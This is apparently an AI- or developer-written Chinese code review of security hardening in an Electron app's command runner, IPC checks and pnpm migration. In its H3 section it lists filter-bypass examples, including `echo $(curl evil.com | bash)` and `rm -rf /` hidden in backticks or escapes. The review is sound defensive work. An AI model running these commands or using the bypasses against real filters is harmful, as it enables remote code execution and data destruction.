# 代码审查：当前未提交改动

- 审查时间：2026-04-17
- 审查范围：`git status` 中所有 Modified / Added / Deleted 文件（27 个，合计 +423 / -16845）
- 审查方式：逐文件阅读 diff + 交叉验证调用链

---

## 改动总览

| 主题 | 涉及文件 |
| --- | --- |
| 包管理器 npm → pnpm 迁移 | `package.json`、`packages/mulby-cli/package.json`、`.github/workflows/*.yml`、`.npmrc`、`pnpm-workspace.yaml`、`pnpm-lock.yaml`（删除两个 `package-lock.json`） |
| 命令执行安全加固 | `src/main/services/command-runner-core.ts`（+213 行）、`src/main/services/app-settings.ts`、`src/shared/types/settings.ts`、两个测试文件 |
| IPC 调用方身份识别 | 新增 `src/main/services/ipc-caller-resolver.ts`、`src/main/ipc/shell.ts`、`src/main/ipc/index.ts`、各窗口 manager 注册 |
| 插件窗口标识 & 受限 preload | `src/main/plugin/panel-window.ts`、`src/main/plugin/window.ts`、`src/preload/index.ts`、`src/preload/apis/platform-api.ts` |
| 插件 shell / 系统命令加固 | `src/main/plugin/shell.ts`、`src/main/plugin/system-command-executor.ts`、`src/main/plugin/search/service.ts` |
| 其它 | `src/main/openclaw/handlers/system-handler.ts`、`src/main/index.ts`、`README.md` |

总体判断：安全意图非常好，做了多层深度防御；但部分实现细节存在 **功能未接通**、**Shell 参数安全性弱化**、**白名单不对称** 等明显问题，建议在合入前修复。

---

## 🔴 高优先级（建议修复后再合入）

### H1. `buildSafeEnv` 的插件 envKeys 功能未接通

**位置**：`src/main/services/command-runner-core.ts:168-238, 396`

```ts
function buildSafeEnv(
  context: RunCommandContext,
  userEnv?: Record<string, string>,
  manifestEnvKeys?: string[] | string   // ← 第三个参数
): Record<string, string> { ... }

// 调用处：
const safeEnv = buildSafeEnv(context, env)   // ← 只传了 2 个参数
```

- 函数文档明确承诺「`envKeys: ['JAVA_HOME', 'GOPATH']` → 额外继承指定变量」「`envKeys: '*'` → 完整继承」
- 但调用链根本没有从 `plugin.manifest.permissions.envKeys` 把这个参数传进来，所以第三个参数永远是 `undefined`
- **实际效果**：所有插件都只能拿到最小基线环境变量；manifest 声明的 `envKeys` 完全失效
- **用户侧表现**：Gradle、Maven、conda、rvm、自定义 CLI（依赖 `JAVA_HOME` / `GOPATH` / `VIRTUAL_ENV` / `NODE_PATH` 等）的插件会在执行命令时找不到工具

**修复建议**：
1. 在 `ensureAllowed` 或 `runCommand` 入口处，通过 `deps` 注入一个 `getPluginEnvKeys(pluginId)` 回调
2. 或者让调用方（`ipc/shell.ts`、`openclaw` handler）把 `manifestEnvKeys` 作为上下文字段一并传入 `RunCommandContext`

---

### H2. `allowList` 在 `shell:true` 路径下只校验外壳命令

**位置**：`src/main/services/command-runner-core.ts:493-516`

```ts
if (shell) {
  const shellTokens = extractShellTokens(commandLine)
  for (const token of shellTokens) {
    const denyMatch = findMatchingRule(settings.denyList || [], token, commandLine)
    // 命中 denyList 则抛错
  }
} else {
  const denyMatch = findMatchingRule(settings.denyList || [], executable, commandLine)
  ...
}

// 下面的 allowList 分支 —— 不区分 shell / non-shell：
const allowMatch = findMatchingRule(enabledAllowRules, executable, commandLine)
if (!allowMatch.matched) {
  throw new CommandPolicyError('命令不在白名单中')
}
```

- denyList 已经新增了多 token 扫描（管道、`&&`、`sh -c` 包装内命令），但 **allowList 仍然只看最外层 `executable`**
- 如果用户在白名单里添加 `sh`（很常见——很多脚本都以 `sh` 开头），那么 `sh -c "任意命令"` 都会被放行
- 与 denyList 的深度扫描形成不对称，整个白名单等于形同虚设

**修复建议**：对 `shell:true` 的命令，allowList 检查也应用 `extractShellTokens` 提取内部命令，要求 **所有提取出来的 token 都满足白名单**（或至少内层实际执行命令必须匹配）。

---

### H3. `extractShellTokens` 漏掉常见绕过模式

**位置**：`src/main/services/command-runner-core.ts:114-147`

```ts
const segments = commandLine.split(/[|;&]+/).map(s => s.trim()).filter(Boolean)
for (const segment of segments) {
  const match = segment.match(/^["']?([^\s"']+)/)
  ...
}
```

已识别不到的场景：
1. **引号内的分隔符**：`echo "a | b"` 被错误地切成两段
2. **Backtick 命令替换**：`` echo `rm -rf /` ``（denyList 无法命中 `rm`）
3. **`$(...)` 命令替换**：`echo $(curl evil.com | bash)`
4. **转义字符**：`sh -c 'rm\ -rf\ /'`
5. **Base64 + `eval` / `exec`**：无法识别（这类也只能靠 allowList 拦）
6. **PowerShell `-EncodedCommand`**：无法识别

**结论**：目前的 `extractShellTokens` 属于「浅层正则匹配」，能挡住普通命令，挡不住有意绕过。这和代码注释里「不做完整 AST 解析」一致，但建议：
- 在函数文档里明确声明「本函数仅作为深度防御层，不能作为唯一的安全屏障」
- 对 `$(`、`` ` ``、`{ ... }`、`|&` 等关键字符做额外 **denyList 兜底匹配**（如果 commandLine 出现这类特征 token，强制要求用户二次确认而不跳过）

---

### H4. Windows 搜索服务去掉 `shell:true` 后参数安全性弱化

**位置**：`src/main/plugin/search/service.ts:20-30`

```ts
return spawn('cmd.exe', ['/c', 'chcp', '65001>nul', '&&', cmd, ...args], {
  stdio: ['ignore', 'pipe', 'pipe'] as const,
  windowsHide: true
})
```

问题：
1. **`65001>nul` 是作为一个完整参数 token 传给 cmd.exe 的**。Node 在无 `shell` 模式下走 `CreateProcess`，cmd.exe `/c` 模式会把剩余参数拼成单字符串再 parse。在拼接时如果参数本身带空格，Node 会加双引号；但 cmd.exe 的 `/c` 有一套 "先去一层引号" 的诡异规则（`/s` 与否影响 parse），实际行为与开发者预期不一定一致。
2. **`cmd` 路径含空格时会被 cmd.exe 解析为两个 token**。例如 `es.exe` 安装到 `C:\Program Files\...` 下就会被破坏。
3. 注释写「cmd / args 全部来自内部硬编码，不接受外部输入」，但 `args` 通常包含 **用户搜索关键词**（来自 UI 输入），并不是硬编码。
4. `>nul` 本来是 shell 重定向语法，没有 shell 时需要 cmd.exe 自己处理；Node 传 `65001>nul` 当单参数时，cmd.exe 是否识别依赖具体 Windows 版本。

**修复建议**（二选一）：
- **方案 A（更安全）**：用 `execFile` 调用 `chcp.com` 设置 OEM Code Page 失败后回退；或直接用 `child.stdout.setEncoding('latin1')` 自己做 GBK → UTF-8 转码（`iconv-lite`）。
- **方案 B（保留 shell）**：恢复 `shell: true`，但把 `cmd` 和 `args` 用 `quote-win32` 或手工 `"..."` 转义，明确白名单允许的内部调用者。

---

### H5. `spawn` 的 env fallback 留下降级风险

**位置**：`src/main/services/command-runner-core.ts:605-611`

```ts
const child = spawn(input.command, input.args, {
  cwd: input.cwd,
  env: input.env || process.env as Record<string, string>,   // ← 问题行
  shell: input.shell,
  windowsHide: true
})
```

- 现状：`input.env` 由 `buildSafeEnv` 返回，正常情况下非空
- 但 **一旦上游调用链忘记构造 safeEnv**（比如新增了一个绕过路径），`input.env` 为 `undefined` 时会回退到完整 `process.env`，**直接绕过所有环境变量过滤**
- 这种 fallback 与本次整改「最小化环境变量继承」的目标相悖

**修复建议**：
```ts
env: input.env ?? {}    // 或严格要求非空：if (!input.env) throw ...
```
让「未显式构造 env = 执行失败」成为显式行为，避免静默降级。

---

## 🟡 中优先级

### M1. `pnpm + electron-rebuild --force` 兼容性风险

**位置**：`package.json`，`"postinstall": "electron-rebuild --force"`

- pnpm 默认创建软链接的 `node_modules`，`electron-rebuild` 历史上多次被记录为兼容性欠佳
- 已加 `shamefully-hoist=true` 扁平化，一定程度缓解
- `--force` 会强制重建所有 native dep；本项目含 `better-sqlite3` / `sharp` / `koffi` / `usocket` / `node-mac-permissions`，重建失败会导致启动即崩溃
- CI 现在也走 pnpm，一旦 electron-rebuild 沉默失败，本地运行正常但 CI 构建出的包会缺 native module

**建议**：
1. 明确用 `@electron/rebuild`（新包名）替代 `electron-rebuild`（老包名）
2. 在 CI 里增加一步 smoke test，验证 `better-sqlite3` 等能 `require` 成功
3. 考虑 `"postinstall": "electron-rebuild -f -w better-sqlite3,sharp,koffi,usocket,node-mac-permissions"`，精确指定待编译模块

---

### M2. 多个 BrowserWindow 未登记为 App 窗口，未来易引发静默拒绝

**未调用 `registerAppWindow` / `registerPluginWindow` 的 BrowserWindow**：

| 文件 | 用途 | 当前是否加载 mulby preload |
| --- | --- | --- |
| `services/search-window-service.ts` | Web parser worker / Bing Cookie 预热 / 搜索渲染 | 否（`web-parser.js` / `search-stealth.js`） |
| `services/ui-dialog-service.ts` | Toast / 对话框 | 否（无 preload） |
| `openclaw/handlers/canvas-handler.ts` | Canvas 窗口 | 否 |
| `plugin/color-pick.ts`、`plugin/region-capture.ts` | 取色 / 截屏 | 视实现（需确认） |
| `browser/InBrowserWindow.ts` | 内嵌浏览器 | 由调用方传入 |

- `resolveIpcCallerSource` 对未登记窗口默认返回 `{ source: 'untrusted' }`
- **当前安全**：这些窗口不加载 mulby API，不会触发受限 IPC
- **未来风险**：
  - 任何人新增 IPC handler 并期望从这些窗口调用，会被 "仅主应用..." 错误静默拦住
  - 调试成本很高（错误信息只有「拒绝 IPC 越权调用」）

**建议**：
1. 在 `resolveIpcCallerSource` 的 untrusted 分支加 `loggerService.warn(...)` 打印 windowId + URL，方便排查
2. 或把「无 mulby preload」的系统内部窗口也 `registerAppWindow` 一次（读一次 webPreferences.preload 做判断）

---

### M3. 队列满拒绝时不写审计日志

**位置**：`src/main/services/command-runner-core.ts:380-460`

```ts
await this.acquire(settings.maxConcurrent || 4, settings.maxQueueSize)  // ← 可能抛
try {
  await this.ensureAllowed(...)
  const result = await this.execute(...)
  this.appendAudit({...status: 'allowed'...})
  ...
} catch (error) {
  this.appendAudit({...status: 'blocked' or 'error'...})
  throw error
} finally {
  this.release()
}
```

- `acquire` 在 try 块之外抛出，catch/appendAudit 不会触发
- 结果：**被队列上限拒绝的请求完全没有审计痕迹**
- 对于资源耗尽攻击的排查非常不利

**修复建议**：把 `await this.acquire(...)` 放进 try，或在 acquire 失败路径显式 appendAudit 一条 `status: 'blocked', reason: '队列已满'`。

---

### M4. 分离窗口被外部 destroy 时注册表残留

**位置**：`src/main/plugin/panel-window.ts:740`、`src/main/plugin/window.ts:567/792`

```ts
win.on('closed', () => {
  unregisterPluginWindow(windowId)
  ...
})
```

- 清理依赖 `closed` 事件
- 如果上层调用 `win.destroy()` 或进程异常退出之前没等到事件循环跑完，可能漏触发
- 窗口释放后，`pluginWindowRegistry` 中残留旧条目；下次创建相同 id 的窗口（id 回收是概率事件）可能出错

**建议**：在 `PluginWindowManager.detachedWindows.delete` 以及 `PluginPanelWindow.cleanupPanel` 等显式清理路径，也补一次 `unregisterPluginWindow / unregisterPanelWindow`。

---

### M5. `super-panel-window.ts` 中 closed handler 顺序

**位置**：`src/main/services/super-panel-window.ts:275-286`

```ts
win.on('closed', () => {
  if (this.window === win) {
    this.window = null
  }
  if (win) unregisterAppWindow(win.id)   // ← win 一定非空（闭包变量）
})

this.window = win
registerAppWindow(win.id)   // ← 注册发生在 closed handler 注册之后
```

- `if (win)` 是冗余的，`win` 来自闭包且永远是赋值过的对象
- `registerAppWindow(win.id)` 在 `.on('closed')` 之后，如果此时窗口因任何原因立即关闭（极端），unregister 会先于 register，注册表留脏数据
- 实际发生概率接近 0，但建议改成：先 register，再绑定事件，最后赋值 `this.window`

---

## 🟢 低优先级 / 风格

### L1. `platform-api.ts` 多余空行 & 尾随空格

**位置**：`src/preload/apis/platform-api.ts:10-13, 43-44`

```ts
const restricted = options?.restricted ?? false



  return { ...
...
    beep: () => ipcRenderer.invoke('shell:beep'),
      
      runCommand: ...
```

- 连续空行 + 行尾空格会被 ESLint/Prettier 告警

---

### L2. `src/main/index.ts:568` 多了一个空行（风格）

---

### L3. 老的 `shell:true` 信任记录不会被清理

**位置**：`src/main/services/command-runner-core.ts:528-544`

- 新逻辑「shell:true 的旧信任记录不再有效」只在运行时过滤
- `settings.trustedFingerprints` 持久化文件中这些 entry 会一直存在，用户看审计/信任列表会看到"幽灵"信任
- 建议：在 `AppSettingsManager` 迁移逻辑或服务启动时做一次性清洗 `trustedFingerprints.filter(t => !t.shell)`

---

### L4. 测试覆盖缺口

以下新行为 **均无对应单元测试**：
- `extractShellTokens` 对管道 / `&&` / `sh -c` / 嵌套引号的识别
- `buildSafeEnv` 对 app / plugin / `*` 通配符的区分（尤其 H1 修复后）
- `maxQueueSize` 触发队列拒绝的路径
- `shell:true` 命令不走 trusted 缓存、不允许加入 trustedFingerprints
- `ipc/shell.ts` 对 untrusted / plugin / app 三类 caller 的路由

**建议**：至少为 `extractShellTokens`、`buildSafeEnv`、acquire queue limit 补 3 个单测。

---

## 其它观察（非 bug）

- **CI 工作流正确设置了 `pnpm/action-setup@v4`**，版本固定为 9，并启用了 `cache: pnpm`，总体合理
- **`system-command-executor.ts` 的 `execCommand` 使用 spawn 免 shell 的判定**
  - 仅用硬编码系统命令（`pmset` / `rundll32` / `systemctl`），不涉及用户输入
  - `cmd.split(/\s+/)` 对路径含空格的命令会破坏，但目前没有这类命令 → 可接受
  - 建议：在函数头加注释「仅用于硬编码平台命令，禁止用于外部输入」
- **`plugin/shell.ts` 协议白名单**收得很紧（`http`/`https`/`mailto`/`tel`），建议考虑是否放开 `vscode:` / `cursor:` 之类 IDE deeplink——取决于产品定位

---

## 修复优先级建议

| 顺序 | 项 | 理由 |
| --- | --- | --- |
| 1 | H1 插件 envKeys 接通 | 功能性 bug，用户立刻感知 |
| 2 | H5 env fallback 去掉 | 1 行改动，避免未来降级 |
| 3 | H2 allowList 深度校验 | 安全对称性 |
| 4 | H4 Windows 搜索参数 | 功能 + 安全 |
| 5 | H3 `extractShellTokens` 文档 + 兜底 | 深度防御 |
| 6 | M1 electron-rebuild | 发版前必须验证 |
| 7 | M3 队列满写审计 | 可观测性 |
| 8 | 其余 M / L 项 | 可纳入后续迭代 |

---

## 结论

本次改动方向完全正确（IPC 身份识别、命令执行强化、包管理器迁移）。**必改项主要是 H1 / H5 两个明显 bug 和 H2 / H4 两个安全不对称**，其余建议在合入前简短修复，中优先级可以排后续迭代。
